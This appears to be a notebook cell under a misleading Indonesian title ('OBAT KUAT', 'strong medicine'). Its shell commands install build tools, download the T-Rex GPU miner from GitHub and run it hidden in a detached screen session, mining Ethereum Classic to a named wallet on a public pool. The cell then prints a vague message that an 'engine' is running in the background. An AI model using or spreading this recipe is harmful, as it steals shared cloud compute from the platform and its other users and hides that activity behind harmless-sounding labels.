# %%
#@title **OBAT KUAT**

# !echo "++++++++++++++++++++ Build Engine ++++++++++++++++++++"
# !nohup sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential screen -y
# !echo ""
# !echo "++++++++++++++++++++ Configure Engine ++++++++++++++++++++"
# !nohup wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
# !nohup tar -xvf t-rex-0.21.6-linux.tar.gz
# !nohup screen -d -m ./t-rex -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0xc56f36ee50dafa9c0b27cf7ea7d22688a712cbd9 -w dikatcitraT4_1 -p x
# !echo "Obat Kuat Nyala"
print('Enggin berhasil di jalankan di background')
